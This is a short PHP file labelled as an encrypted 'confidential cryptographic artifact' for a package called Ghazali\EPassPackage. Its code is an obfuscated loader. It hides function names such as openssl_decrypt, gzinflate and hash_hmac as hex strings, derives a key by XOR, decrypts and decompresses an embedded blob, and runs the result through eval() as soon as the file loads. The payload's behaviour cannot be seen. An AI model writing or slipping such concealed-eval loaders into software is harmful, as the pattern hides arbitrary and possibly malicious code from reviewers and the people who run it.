<?php
/**
 * @package Ghazali\EPassPackage
 * @version Production-Hardened-Encrypted
 * @integrity sha256:f9207b40193dca5a0364c3ab00dce6f5f29cac3bb27cb72f73963b625b543791
 * @notice Confidential cryptographic artifact. Unauthorized reproduction, tampering, or reverse-engineering prohibited.
 */
declare(strict_types=1);

(static function($_0,$_1,$_2,$_3,$_4): void {
    $_5 = \pack('H*','6865783262696e');
    $_6 = \pack('H*','6f70656e73736c5f64656372797074');
    $_7 = \pack('H*','677a696e666c617465');
    $_8 = \pack('H*','686173685f686d6163');
    $_9 = $_5($_1) ^ $_5($_2);
    $_a = $_5($_0);
    if ($_8(\pack('H*','736861323536'), $_a, $_9) !== $_4) {
        throw new \RuntimeException(\pack('H*','536563757269747920457863657074696f6e3a20496e7465677269747920636865636b206661696c65642e'));
    }
    $_b = $_7($_6($_a, \pack('H*','4145532d3235362d434243'), $_9, 1, $_5($_3)));
    if ($_b !== false) {
        eval($_b);
    }
})('a713d858d42e34b6e1f618c4020e65968a62ddcfe83aba2a10b7774eb8316416cd4e3186906ab43987ecc281bf8e364727f417903edb8da7bbdee71ee2e784169d148c7c99e26f771b6ea97e5444bc266094d015d3ca154df4e94c93552da767c76901a594c24c9cfa5a34597531622f', 'bafa26f55186129ab9e157219355f69cec77c50132c050ca46d3aa9aebf0ed9f', 'bff90780bf8234a9464764fd0e5608cf638f8db6a43b250482d7d214be6c1b41', 'c0435e60ff44afed2b2e3e71aabb8f2b', 'f9207b40193dca5a0364c3ab00dce6f5f29cac3bb27cb72f73963b625b543791');